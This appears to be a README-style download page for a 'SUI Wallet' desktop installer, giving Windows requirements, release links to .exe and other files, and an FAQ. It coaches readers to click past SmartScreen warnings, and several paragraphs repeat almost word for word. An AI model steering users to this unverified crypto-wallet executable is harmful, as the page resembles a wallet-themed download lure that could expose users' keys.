![SUI Wallet](assets/banner-article.png)

# Downloading SUI Wallet for Windows 10

Windows 10 build 1909 or later, 64-bit: what the download needs and what to do if it refuses.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Windows 10 build 1909 or later, 64-bit: that is the whole requirement, and the file is the `.exe` on the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest). Windows 11 is later than 1909, so it meets the same line. A 32-bit Windows install is outside
it, and no older Windows is supported however well the installer runs.

## What the Windows build is

One installer, built for 64-bit Windows. It is the first of the three files on the release page, alongside
the macOS disk image and the Linux archive, and it belongs only on Windows - the other two will not run
here.

The release is the single distribution channel, so anything offered as a "Windows download" from a search
result, an advertisement or a mirror is not the file this page describes, whatever it is named.

Two things on the release page identify the Windows file without running anything: its extension, and the SHA-256 value printed beside it. Neither depends on the file being opened, which is why both can be checked before Windows forms an opinion about it.

## Checking your Windows version

Open Settings, go to System and About, and read two lines: the Windows edition and the build. The edition
tells you whether this is Windows 10 or 11; the build number is what the requirement is written against,
because 1909 is a feature update rather than a marketing name.

Then check the architecture on the same screen. It has to say 64-bit. A 32-bit install cannot run a 64-bit
build, and that is a hard stop rather than a warning.

A build number below 1909 is a machine to upgrade rather than a file to hunt for. Windows 10 releases after 1909 are supported, and the build number on the About screen is the one to compare against the requirement rather than the edition name alone.

## Windows 10 and Windows 11

The requirement reads Windows 10 (1909) or later, which is a floor rather than a list of supported versions. Windows 11 is later than 1909 and ships 64-bit, so it meets the line, and nothing in these guides changes between the two systems.

What differs is the block screen's behaviour rather than the app: Windows 10 and 11 word the SmartScreen
panel slightly differently, and the option to run a file Windows has not seen often sits in different
places in the two shells.

## Where it goes after installation

The installer puts the application on the machine and creates a shortcut; the account arrives later, at first launch, and it is the 24 words rather than the installation. That distinction decides what an update means, because an update replaces the application and never the phrase.

That distinction is worth holding on to because it decides what an update means: running a newer installer
replaces the application, and the account remains what it always was - derived from the phrase.
[How to install SUI Wallet on Windows](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-install-sui-wallet-on-windows.md) walks the install and the first window in order.

The shortcut is a convenience rather than the application, which matters when a Windows update or a disk clean-up removes it. Re-running the current installer restores the shortcut and leaves everything else alone, because the account was never in that folder to begin with.

## What a Windows update changes

A feature update can leave a shortcut pointing at a path that no longer exists, and the symptom is an app
that will not start rather than one that is missing. Re-running the current installer restores the shortcut
and leaves the account alone.

Nothing about a Windows update touches the phrase, which lives on paper rather than in the operating
system. [SUI Wallet won't open after install](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-wont-open-after-install.md) covers the start-up failures worth checking, in the
order worth checking them.

A feature update can also leave a shortcut opening the wrong program, which looks like a wallet fault and is a file association. Checking what the shortcut points at is faster than reinstalling and tells you which of the two problems you have.

## The checks worth doing before you run it

Compare the file's SHA-256 digest with the value published beside the Windows asset, then run it. The check takes one command and it is the only way to know the installer is the one the project built, before Windows forms an opinion about the file.

[SUI Wallet system requirements](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-system-requirements.md) carries the three requirement strings in one place if the machine
is one you are unsure about, and the download guide compares the three files if the choice is still open.

## FAQ

### Does SUI Wallet run on Windows 11?

Yes. Windows 11 is later than the 1909 floor and is 64-bit, so it meets the published requirement. The
guides are written for both, and the only differences are in how Windows words its block screens.

### Does it run on Windows 8.1 or Windows 7?

No. Both are older than the requirement, and a build that happens to start on one is luck rather than
support.

### Will it run on a 32-bit Windows install?

No. The build is 64-bit only, and the architecture is the first thing to check when a machine is old.

### Is the Windows file an installer or a portable app?

An installer for Windows. The archive format belongs to the Linux build, which is packaged that way because
that is the convention there.

### Do I need a Microsoft account?

No. Downloading is free and needs no account, and the wallet itself has no account with a server - the keys
are generated and stored on this machine.

### What if Windows warns me about the file?

That is the SmartScreen panel for a file Windows has not seen often. Check the digest, then answer the
panel; the wording differs between Windows 10 and 11 but the decision is the same.
